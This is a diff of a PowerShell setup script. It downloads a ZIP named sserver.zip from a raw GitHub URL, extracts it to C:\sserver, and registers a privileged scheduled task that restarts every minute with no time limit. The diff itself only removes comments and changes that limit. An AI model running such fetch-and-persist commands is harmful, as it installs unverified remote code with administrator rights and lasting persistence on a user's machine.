@@ -1,18 +1,7 @@
-# Run this PowerShell as Administrator
-
-# -------------------------------
-# 1️⃣ Create folder, download & extract ZIP
-# -------------------------------
 Set-Location C:\
 New-Item -ItemType Directory -Path "C:\sserver" -Force | Out-Null
-
-# download (curl.exe is fine) - or use Invoke-WebRequest if you prefer
 curl.exe -L "https://raw.githubusercontent.com/rezwanahmedratul/logo/main/sserver.zip" -o "C:\sserver\sserver.zip"
-
-# extract ZIP using PowerShell native cmdlet
 Expand-Archive -Path "C:\sserver\sserver.zip" -DestinationPath "C:\sserver" -Force
-
-# remove zip
 Remove-Item "C:\sserver\sserver.zip" -Force -ErrorAction SilentlyContinue
 
 # -------------------------------
@@ -41,7 +30,7 @@ $settings = New-ScheduledTaskSettingsSet `
     -RestartInterval (New-TimeSpan -Minutes 1) `
     -DontStopIfGoingOnBatteries `
     -AllowStartIfOnBatteries `
-    -ExecutionTimeLimit ([TimeSpan]::MaxValue)   # fixed: use a TimeSpan
+    -ExecutionTimeLimit ([TimeSpan]::Zero)  # no limit
 
 # Register under current user (runs at highest; run PowerShell as Admin to set RunLevel Highest)
 Register-ScheduledTask `
